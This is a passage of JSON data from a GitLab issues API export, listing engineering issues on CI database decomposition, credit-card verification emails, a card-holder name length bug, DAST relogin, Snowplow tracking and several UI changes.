problems](https://gitlab.com/search?group_id=9970\u0026project_id=278964\u0026repository_ref=\u0026scope=issues\u0026search=CrossDatabaseModificationAcrossUnsupportedTablesError\u0026snippets=false) or you can ask in `#g_sharding` if something is unclear.\n\ncc @tkuah as you fixed a very similar issue in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74583 and we can probably just do the same thing for this.","state":"closed","created_at":"2021-11-22T05:31:18.676Z","updated_at":"2022-02-18T03:34:40.915Z","closed_at":"2022-02-18T01:05:10.296Z","closed_by":{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"},"labels":["backend","ci-decomposition","ci-decomposition::phase4","devops::secure","group::threat insights","missed:14.6","section::sec","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"}],"author":{"id":120073,"username":"DylanGriffith","name":"Dylan Griffith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/120073/avatar.png","web_url":"https://gitlab.com/DylanGriffith"},"type":"ISSUE","assignee":{"id":7825316,"username":"subashis","name":"Subashis  Chakraborty","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/7825316/avatar.png","web_url":"https://gitlab.com/subashis"},"user_notes_count":29,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346236","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346236","notes":"https://gitlab.com/api/v4/projects/278964/issues/346236/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346236/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346236","relative":"#346236","full":"gitlab-org/gitlab#346236"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6373,"epic":{"id":309455,"iid":6373,"title":"Decomposition: Make Secure features compatible with Decomposed CI database","url":"/groups/gitlab-org/-/epics/6373","group_id":9970,"human_readable_end_date":"Aug 17, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97707869,"iid":346233,"project_id":278964,"title":"[Engineering] When pipeline fails due to cc verification failure, email the user with instructions","description":"UX issue: https://gitlab.com/gitlab-org/growth/team-tasks/-/issues/463\n\n# Problem\nCurrently GitLab requires that users verify a credit card before a user can utilize Verify pipelines. Because that requirement was put in place as a stop gap measure to decrease abuse of our pipelines the user experience around that requirement is not ideal. The users pipeline fails and they have to click into the pipeline in order to see how to fix the issue:\n\n![image](/uploads/8d46ea17901976c4fd6d8c08ae0cd2ae/image.png)\n\n![image](/uploads/8b6dcef6460853e6e05bb9867dce0a33/image.png)\n\n# Hypothesis\nIf we email the user when a pipeline fails for this reason we would a better experience to verify a credit card it will increase initial verify usage.\n\n# Requirements\n1. Email the user who initiated the pipeline when their pipeline fails because they have not validated a cc\n2. Email should include explicit instructions on how to validate their cc and get their pipeline passing\n3. Email should go out as soon as the pipeline fails for this reason and can go alongside the generic pipeline failure email.\n\n# Proposed Solution\n\n**Email Subject Line:** Fix your pipelines by validating your account\n\n**Email Header:** Looks like you’ll need to validate your account to use free pipeline minutes\n\n**Email Body Copy:**\n\nIn order to use free pipeline minutes on shared runners, you'll need to validate your account with a credit or debit card. If you prefer not to provide one, you can run pipelines by bringing your own runners and disabling shared runners for your project.\n\nThis is required to discourage and reduce the abuse on GitLab infrastructure. **GitLab will not charge or store your card, it will only be used for validation**. [Learn more.](https://about.gitlab.com/blog/2021/05/17/prevent-crypto-mining-abuse/)\n\n**Main CTA:** Validate your account -\u003e Links to Validation Modal\n\n**Secondary CTA:** I'll bring my own runners -\u003e Links to https://docs.gitlab.com/runner/install/\n\n**Icon:** https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/images/mailers/in_product_marketing/verify-2.png\n\n| Email Visual | \n| ------ | \n| ![Screen_Shot_2021-10-27_at_8.49.50_AM](/uploads/68c0b988cc30c32d3356bad0d600c855/Screen_Shot_2021-10-27_at_8.49.50_AM.png) |\n\n#### [Design File](https://www.figma.com/file/QdlMRkuFdKj2YcypoJNdHq/Credit-Card-Verification-Updates?node-id=2%3A49)\n\n# Implementation\n\n- [x] Create mailer action and views (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75080)\n- [x] Implement send email logic when pipeline fails because of unverified account (https://gitlab.com/gitlab-org/gitlab/-/merge_requests/75183)\n- [x] Implement tracking","state":"closed","created_at":"2021-11-22T03:26:14.056Z","updated_at":"2021-12-17T14:25:39.653Z","closed_at":"2021-12-17T14:25:39.620Z","closed_by":{"id":9670031,"username":"eugielimpin","name":"Eugie Limpin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9670031/avatar.png","web_url":"https://gitlab.com/eugielimpin"},"labels":["DEPRECATED Growth-Deliverable","auto updated","devops::growth","group::activation","section::growth","type::feature","workflow::production"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":9670031,"username":"eugielimpin","name":"Eugie Limpin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9670031/avatar.png","web_url":"https://gitlab.com/eugielimpin"}],"author":{"id":9670031,"username":"eugielimpin","name":"Eugie Limpin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9670031/avatar.png","web_url":"https://gitlab.com/eugielimpin"},"type":"ISSUE","assignee":{"id":9670031,"username":"eugielimpin","name":"Eugie Limpin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9670031/avatar.png","web_url":"https://gitlab.com/eugielimpin"},"user_notes_count":14,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346233","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":3},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346233","notes":"https://gitlab.com/api/v4/projects/278964/issues/346233/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346233/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346233","relative":"#346233","full":"gitlab-org/gitlab#346233"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":104532335,"iid":355303,"project_id":278964,"title":"Unable to save credit card validation due to name length","description":"## Problem\n\nhttps://sentry.gitlab.net/gitlab/customersgitlabcom/issues/2988223/?referrer=gitlab_plugin\n\nSpecific event: https://sentry.gitlab.net/gitlab/customersgitlabcom/issues/2988223/events/58585295/\n\n\n```\nStacktrace (most recent call first):\n\n  lib/gitlab/logger_helpers.rb:24:in `public_send'\n    Gitlab::Logger.public_send(log_level, object, options) # rubocop:disable GitlabSecurity/PublicSend\n  lib/gitlab/logger_helpers.rb:24:in `log'\n    Gitlab::Logger.public_send(log_level, object, options) # rubocop:disable GitlabSecurity/PublicSend\n  lib/gitlab/logger_helpers.rb:13:in `log_error'\n    log(:error, error, extra: extra)\n  app/services/zuora_callbacks/credit_card_validation_service.rb:60:in `mark_valid_cc_for_user'\n    log_error(\n  app/services/zuora_callbacks/credit_card_validation_service.rb:18:in `execute'\n    mark_valid_cc_for_user\n  app/controllers/zuora_callbacks_controller.rb:26:in `credit_card_validation'\n    ).execute\n  lib/middleware/maintenance.rb:25:in `call'\n    @app.call(env)\n  lib/middleware/health_check/health_check_responder.rb:14:in `call'\n    return @app.call(env) if format.nil? || (ip_blocked(env) \u0026\u0026 not_authenticated(env))\n...\n(78 additional frame(s) were not displayed)\n\nunable to save credit card validation\n```\n\nKibana: https://log.gprd.gitlab.net/goto/a59f573cb130fe1b14eee41e521714cf\n\n## Proposal\n\nUpdate character constraint on Credit Card Holder Name from 26 to 50\n\n## Implementation Plan\n\nUpdate this area of code from `26` to `50` https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71032#note_692224348","state":"closed","created_at":"2021-11-22T02:01:16.247Z","updated_at":"2022-03-22T03:03:22.280Z","closed_at":"2022-03-18T08:45:15.648Z","closed_by":{"id":4903695,"username":"shreyasagarwal","name":"Shreyas Agarwal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d5b09dfe06a10d119c1b2043c43de680?s=80\u0026d=identicon","web_url":"https://gitlab.com/shreyasagarwal"},"labels":["Category:Purchase","Support Priority","backend","customer","devops::fulfillment","group::purchase","missed-SLO","priority::2","section::fulfillment","severity::2","type::bug","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4903695,"username":"shreyasagarwal","name":"Shreyas Agarwal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d5b09dfe06a10d119c1b2043c43de680?s=80\u0026d=identicon","web_url":"https://gitlab.com/shreyasagarwal"}],"author":{"id":402401,"username":"jobbot","name":"Bot","state":"active","avatar_url":"https://secure.gravatar.com/avatar/aaa6738f1ebf25404010884af511b0e7?s=80\u0026d=identicon","web_url":"https://gitlab.com/jobbot"},"type":"ISSUE","assignee":{"id":4903695,"username":"shreyasagarwal","name":"Shreyas Agarwal","state":"active","avatar_url":"https://secure.gravatar.com/avatar/d5b09dfe06a10d119c1b2043c43de680?s=80\u0026d=identicon","web_url":"https://gitlab.com/shreyasagarwal"},"user_notes_count":30,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/355303","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/355303","notes":"https://gitlab.com/api/v4/projects/278964/issues/355303/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/355303/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#355303","relative":"#355303","full":"gitlab-org/gitlab#355303"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97700282,"iid":346228,"project_id":278964,"title":"Force the DAST scanner to always relogin","description":"### Problem to solve\n\nSometimes DAST can not maintain a logged-in session between different browser tabs.\n\n### Proposal\n\nTo allow customers to quickly resolve this implement `AlwaysRelogin`.\n\n`AlwaysRelogin` is already implemented in the browser-based DAST scanner configuration but is not used.\nImplement `AlwaysRelogin` in the browser-based analyzer and in DAST to allow customers to configure and use it.\n\n### Implmentation Plan\n\n- [x] Implement `AlwaysRelogin` in browser based scanner\n- [x] Add `AlwaysRelogin` to DAST","state":"closed","created_at":"2021-11-21T21:52:22.849Z","updated_at":"2021-11-29T03:21:20.152Z","closed_at":"2021-11-23T05:21:02.225Z","closed_by":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"labels":["Category:DAST","dast::browserker","devops::secure","group::dynamic analysis","section::sec","type::feature","workflow::in dev"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"}],"author":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"type":"ISSUE","assignee":{"id":5344211,"username":"craigmsmith","name":"Craig Smith","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5344211/avatar.png","web_url":"https://gitlab.com/craigmsmith"},"user_notes_count":0,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346228","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":2,"completed_count":2},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 2 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346228","notes":"https://gitlab.com/api/v4/projects/278964/issues/346228/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346228/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346228","relative":"#346228","full":"gitlab-org/gitlab#346228"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97686091,"iid":346214,"project_id":278964,"title":"Instrument how many custom value streams have been created","description":"\u003c!--\n* Use this issue template for creating requests to track snowplow events\n* Snowplow events can be both Frontend (javascript) or Backend (Ruby)\n* Snowplow is currently not used for self-hosted instances of GitLab - Self-hosted still rely on usage ping for product analytics - Snowplow is used for GitLab SaaS\n* You do not need to create an issue to track generic front-end events, such as All page views, sessions, link clicks, some button clicks, etc.\n* What you should capture are specific events with defined business logic. For example, when a user creates an incident by escalating an existing alert, or when a user creates and pushes up a new Node package to the NPM registry.\n* For more details read https://about.gitlab.com/handbook/business-technology/data-team/programs/data-for-product-managers/\n --\u003e\n\n## Purpose of this tracking event\n\nTo understand how many custom value streams have been created.\n\n\n\u003c!--\nWe generally recommend events be tracked using a [structured event](https://docs.snowplowanalytics.com/docs/understanding-tracking-design/out-of-the-box-vs-custom-events-and-entities/#structured-events) which has 5 properties you can use. There may be instances where structured events are not sufficient. You may want to track an event where the property changes frequently or is general something very unique. In those cases, use a [self-describing event](https://docs.snowplowanalytics.com/docs/understanding-tracking-design/out-of-the-box-vs-custom-events-and-entities/#self-describing-events)\n\n--\u003e\n\n## Structured Snowplow events to track\n\n* Category: The page or backend area of the application. Unless infeasible, please use the Rails page attribute by default in the frontend, and namespace + classname on the backend. If you're not sure what it is, work with your engineering manager to figure it out.\n* Action: A string that is used to define the user action. The first word should always describe the action or aspect: clicks should be `click`, activations should be `activate`, creations should be `create`, etc. Use underscores to describe what was acted on; for example, activating a form field would be `activate_form_input`. An interface action like clicking on a dropdown would be `click_dropdown`, while a behavior like creating a project record from the backend would be `create_project`\n* Label: Optional. The specific element, or object that's being acted on. This is either the label of the element (e.g. a tab labeled 'Create from template' may be `create_from_template`) or a unique identifier if no text is available (e.g. closing the Groups dropdown in the top navbar might be `groups_dropdown_close`), or it could be the name or title attribute of a record being created.\n* Property: Optional. Any additional property of the element, or object being acted on.\n* Value: Optional, numeric. Describes a numeric value or something directly related to the event. This could be the value of an input (e.g. `10` when clicking `internal` visibility)\n\n| Category | Action | Label | Property | Feature Issue | Additional Information |\n| ------ | ------ | ------ | ------ | ------ | ------ |\n| cell | cell | cell | cell | cell | cell |\n| cell | cell | cell | cell | cell | cell |\n\n\u003c!--\n  Snowplow event tracking starts with instrumentation and completed after a chart is created in Sisense.\n\n  Use this checklist to ensure all steps are completed\n--\u003e\n\n## Snowplow event tracking checklist\n* [x] Engineering complete work and deploy changes to GitLab SaaS\n* [x] Verify the new Snowplow events are listed in the [Snowplow Event Exploration](https://app.periscopedata.com/app/gitlab/539181/Snowplow-Event-Exploration---last-30-days) dashboard\n* [x] Create chart(s) to track your event(s) in the relevant dashboard\n  * [x] Use the [Chart Snowplow Actions](https://app.periscopedata.com/app/gitlab/snippet/Chart-Snowplow-Actions/5546da87ae2c4a3fbc98415c88b3eedd/edit) SQL snippet to quickly visualize usage. See [example](https://app.periscopedata.com/app/gitlab/737489/Health-Group-Dashboard?widget=9797112\u0026udv=0)\n\n\u003c!-- Label reminders - you should have one of each of the following labels.\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-11-21T10:56:54.283Z","updated_at":"2022-05-25T00:05:15.923Z","closed_at":"2022-01-04T18:39:09.035Z","closed_by":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"labels":["auto updated","backend","devops::manage","group::optimize","instrumentation","product intelligence","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"}],"author":{"id":4156460,"username":"ogolowinski","name":"Orit Golowinski","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4156460/avatar.png","web_url":"https://gitlab.com/ogolowinski"},"type":"ISSUE","assignee":{"id":4512390,"username":"djensen","name":"Dan Jensen","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4512390/avatar.png","web_url":"https://gitlab.com/djensen"},"user_notes_count":16,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346214","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":4},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"4 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346214","notes":"https://gitlab.com/api/v4/projects/278964/issues/346214/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346214/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346214","relative":"#346214","full":"gitlab-org/gitlab#346214"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97683456,"iid":346209,"project_id":278964,"title":"Frontend: Change the Pipeline page fixed layout to full-width","description":"## Problem\n\nFollowing https://gitlab.com/gitlab-org/gitlab/-/issues/205300 and similar to https://gitlab.com/gitlab-org/gitlab/-/issues/346331\n\nThe pipeline graph is horizontally scrollable, with lots of information to consume. Limiting the width of the page means we don't utilize that space to show more of the graph.\n\n## Proposal\n\nhttps://design.gitlab.com/layout/grid#fixed-layout\n\nWe want to make the pipeline page full-width by making the \"fixed\" layout use full-width, so we can leverage more space for the pipeline graph, especially beneficial for users with a large screen who can't utilize that extra space by default today.\n\n\n| Current layout (fixed at 990px) | Fixed at full-width |\n|----------------|-------------------|\n| ![image](/uploads/62272e4e7c8e03f0de403cb5f426178c/image.png) | ![image](/uploads/5650458d1485dc66e32af0d7b2b8aa87/image.png)|","state":"closed","created_at":"2021-11-21T08:27:04.995Z","updated_at":"2022-01-20T12:52:09.469Z","closed_at":"2022-01-20T12:52:09.456Z","closed_by":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"labels":["Category:Pipeline Authoring","UI polish","Verify candidate","auto updated","candidate::14.8","devops::verify","frontend","group::pipeline authoring","section::ops","severity::4","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"}],"author":{"id":4509877,"username":"dhershkovitch","name":"Dov Hershkovitch","state":"active","avatar_url":"https://secure.gravatar.com/avatar/7daa3113f0359f08a217fa800d9cc1d2?s=80\u0026d=identicon","web_url":"https://gitlab.com/dhershkovitch"},"type":"ISSUE","assignee":{"id":5327378,"username":"f_caplette","name":"Frédéric Caplette","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5327378/avatar.png","web_url":"https://gitlab.com/f_caplette"},"user_notes_count":7,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346209","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346209","notes":"https://gitlab.com/api/v4/projects/278964/issues/346209/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346209/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346209","relative":"#346209","full":"gitlab-org/gitlab#346209"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97655647,"iid":346188,"project_id":278964,"title":"FE: Security Policy Drawer does not handle cluster image scanning policies","description":"## Why are we doing this work\n- as users create cluster image scanning policies, they will want to see a preview of it in the policy list drawer\n\n\n## Relevant links\n- No designs yet\n\n\n## Non-functional requirements\n- [ ] Documentation:\n- [ ] Testing:\n\n\n## Implementation plan\n- [x] ~frontend update [the humanizeRules function](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/assets/javascripts/threat_monitoring/components/policy_editor/scan_execution_policy/lib/humanize.js#L81) to handle if there are no `branches` on the rule, but there are `clusters` on the rule\n- [ ] ~frontend update [the humanizeRules function](https://gitlab.com/gitlab-org/gitlab/blob/master/ee/app/assets/javascripts/threat_monitoring/components/policy_editor/scan_execution_policy/lib/humanize.js#L81) to handle if there are `agents` on the rule and display the agent like the method currently displays branches","state":"closed","created_at":"2021-11-20T00:20:07.187Z","updated_at":"2022-10-24T03:21:56.994Z","closed_at":"2022-10-18T15:05:59.543Z","closed_by":{"id":10762712,"username":"arfedoro","name":"Artur Fedorov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10762712/avatar.png","web_url":"https://gitlab.com/arfedoro"},"labels":["Category:Security Policy Management","Enterprise Edition","GitLab Ultimate","auto updated","devops::govern","frontend","frontend-weight::3","group::security policies","missed:14.6","missed:14.7","section::sec","type::feature","workflow::in review"],"milestone":{"id":2687593,"iid":81,"group_id":9970,"title":"15.6","description":"","state":"active","created_at":"2022-07-06T19:22:27.893Z","updated_at":"2022-07-06T19:22:27.893Z","due_date":"2022-11-17","start_date":"2022-10-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/81"},"assignees":[{"id":10762712,"username":"arfedoro","name":"Artur Fedorov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10762712/avatar.png","web_url":"https://gitlab.com/arfedoro"}],"author":{"id":5537154,"username":"aturinske","name":"Alexander Turinske","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5537154/avatar.png","web_url":"https://gitlab.com/aturinske"},"type":"ISSUE","assignee":{"id":10762712,"username":"arfedoro","name":"Artur Fedorov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/10762712/avatar.png","web_url":"https://gitlab.com/arfedoro"},"user_notes_count":10,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346188","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":4,"completed_count":1},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"1 of 4 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346188","notes":"https://gitlab.com/api/v4/projects/278964/issues/346188/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346188/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346188","relative":"#346188","full":"gitlab-org/gitlab#346188"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":3410,"epic":{"id":59230,"iid":3410,"title":"Cluster Image Scanning (Vulnerability Scans against Running Containers)","url":"/groups/gitlab-org/-/epics/3410","group_id":9970,"human_readable_end_date":"Dec 13, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97652877,"iid":346171,"project_id":278964,"title":"Improve existing upload metrics image experience","description":"Note: This issue originated from discussions in [this](https://gitlab.com/gitlab-org/gitlab/-/issues/340852#note_704306205) related issue.\n\n### Release Notes\nImprove existing upload metrics image experience\nhttps://docs.gitlab.com/ee/operations/incident_management/incidents.html#metrics\n\n## Problems to be solved\n\n1. It's not obvious that links added to charts are, in fact, links, because we're displaying the file name rather than a URL:\n\n![image](/uploads/9994e4bc52b22e72d61ae89eae51a9b4/image.png)\n\n1. Links can only be added when the image is uploaded, not after the fact. So, if you don't immediately add a link, you have to delete the image and start over. Links that have been added also can't be edited.\n1. It's not very easy to quickly add multiple images. Speed is important when it comes to uploading images. From Dave Smith:\n\n\u003e Sometimes as an incident manager, I'm adding 2 or 3 screenshots while trying to pay attention to what we are doing in the incident room.\n\n## Proposal \n\n1. Displaying the link and an external link icon when a URL has been added to an image:\n\n![Screen_Shot_2022-01-11_at_4.28.48_PM](/uploads/aa27245b9524bd03a55d9409badca743/Screen_Shot_2022-01-11_at_4.28.48_PM.png)\n\n2. Ease the process for uploading multiple images by closing the upload dialog as soon as the upload button is clicked, rather than waiting for the upload to complete. This may mean it will be difficult for us to determine which upload has failed, if there are multiple. But, we can modify the error message to indicate this as follows:\n\n![Screen_Shot_2022-01-14_at_3.01.18_PM](/uploads/d0dea7fd87783617e20adec9a8339d61/Screen_Shot_2022-01-14_at_3.01.18_PM.png)\n\n3. Introduce a link button on image uploads. This will allow us to edit already added links, as well as to introduce links on images that have already been uploaded. See designs below for additional details.\n\n![Screen_Shot_2022-01-11_at_4.33.49_PM](/uploads/b308dc80897898012480c204018d57a5/Screen_Shot_2022-01-11_at_4.33.49_PM.png)\n\n## Designs\n\n**Adding a link to an already uploaded image**\n\n| Hover tooltip | Add link modal |\n| ------ | ------ |\n| ![Alert_page_-_metrics_tab_-_no_link_added_yet](/uploads/d3868eb6be7a3ef31210f98a523b8e76/Alert_page_-_metrics_tab_-_no_link_added_yet.png)| ![Add_a_URL](/uploads/8e4f06d8a381f0011a396757d559ccbd/Add_a_URL.png) |\n\n**Editing an already added link**\n\n| Hover tooltip | Edit link modal | Updated link, with replacement text |\n| ------ | ------ | ------ |\n| ![Edit_tooltip](/uploads/eb72a77c940f07181d77a37d4409b442/Edit_tooltip.png) | ![Edit_link_modal](/uploads/abd1edf1c7f01fd5e91585d52d0b7363/Edit_link_modal.png) | ![Link_updated](/uploads/d02bdf31d11adbfecfd98e90591aa118/Link_updated.png) |\n\n\n[Figma file](https://www.figma.com/file/Ayi9NNAznb1yyFvVb1jz3p/Improve-metric-and-log-tab-experience-gitlab-com%26218694-(Copy)?node-id=1%3A79)\n\n### Intended users\n\n\u003c!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write \"Unknown\" and fill this field in later.\n\nPersonas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/\n\n* [Cameron (Compliance 